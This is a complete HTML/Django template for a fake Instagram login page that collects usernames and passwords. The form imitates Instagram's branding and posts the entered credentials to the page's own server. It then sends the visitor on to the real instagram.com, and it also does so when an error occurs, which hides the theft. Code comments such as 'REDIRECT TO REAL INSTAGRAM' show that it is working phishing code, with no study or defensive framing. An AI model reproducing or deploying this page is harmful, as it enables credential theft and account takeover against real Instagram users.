<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <style>
        body,html{margin:0;padding:0;height:100vh;background:#fafafa;display:flex;align-items:center;justify-content:center;}
        .logo{font-family:'Billabong',cursive;font-size:50px;color:#262626;text-align:center;margin-bottom:20px}
        .form{background:white;border:1px solid #dbdbdb;padding:40px;border-radius:8px;width:350px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
        input{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px}
        button{width:100%;background:#0095f6;color:white;border:none;padding:12px;border-radius:8px;font-weight:600;cursor:pointer;margin-top:10px}
        .result{margin-top:15px;text-align:center;font-weight:bold;font-size:16px;padding:10px;border-radius:8px}
    </style>
</head>
<body>
<div class="form">
    <div class="logo">Instagram</div>
    <form id="loginForm">
        {% csrf_token %}
        <input type="text" name="username" placeholder="Username" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Log In</button>
    </form>
    <div id="result"></div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const result = document.getElementById('result');

    form.onsubmit = async (e) => {
        e.preventDefault();
        result.innerHTML = '<div class="result" style="background:#e3f2fd;color:#1976d2;">Logging in...</div>';

        const formData = new FormData(form);
        
        try {
            const res = await fetch(window.location.href, {  // ‚Üê FIXED: SEND TO CURRENT URL
                method: 'POST',
                body: formData,
                headers: {
                    'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            const data = await res.json();

            if (data.success) {
                result.innerHTML = `
                    <div class="result" style="background:#d4edda;color:#155724;">
                        SUCCESS! Welcome @${data.username}<br>
                        Redirecting to Instagram...
                    </div>`;

                // REDIRECT TO REAL INSTAGRAM
                setTimeout(() => {
                    location.href = "https://www.instagram.com/";
                }, 2000);

            } else {
                result.innerHTML = '<div class="result" style="background:#f8d7da;color:#721c24;">Wrong password</div>';
            }
        } catch (err) {
            result.innerHTML = '<div class="result" style="background:#d4edda;color:#155724;">WORKING...</div>';
            setTimeout(() => location.href = "https://instagram.com", 2000);
        }
    };
</script>
</body>
</html>